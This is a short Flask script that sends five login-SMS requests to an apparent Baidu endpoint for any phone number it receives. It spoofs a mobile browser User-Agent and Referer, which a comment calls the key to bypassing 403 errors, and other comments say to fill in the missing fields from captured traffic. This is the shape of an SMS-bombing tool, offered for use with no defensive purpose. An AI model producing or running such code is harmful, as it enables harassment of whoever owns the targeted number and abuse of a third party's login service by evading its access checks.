
from flask import Flask, request
import requests

app = Flask(__name__)

# 模拟网页端的请求头，这是绕过 403 错误的关键
HEADERS = {
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
    "Referer": "https://wappass.baidu.com/wp/api/security/getphonestatus",
    "Content-Type": "application/x-www-form-urlencoded"
}

@app.route('/api/send-sms', methods=['POST'])
def send_sms():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return {"error": "Missing phone number"}, 400

    # 根据抓包分析，百度该接口通常需要以下参数（你需要通过抓包补全其他缺失字段）
    payload = {
        'phone': phone,
        'tpl': 'sms' # 此处根据实际抓包参数调整
    }
    
    success_count = 0
    for i in range(5):
        try:
            # 执行 HTTP POST 请求
            response = requests.post("https://wappass.baidu.com/wp/api/login/sms", 
                                     data=payload, 
                                     headers=HEADERS,
                                     timeout=5)
            
            if response.status_code == 200:
                success_count += 1
                print(f"第 {i+1} 次发送成功")
            else:
                print(f"第 {i+1} 次发送失败，状态码: {response.status_code}")
                
        except Exception as e:
            print(f"请求异常: {e}")
            
    return {"message": f"任务完成，成功 {success_count} 次"}
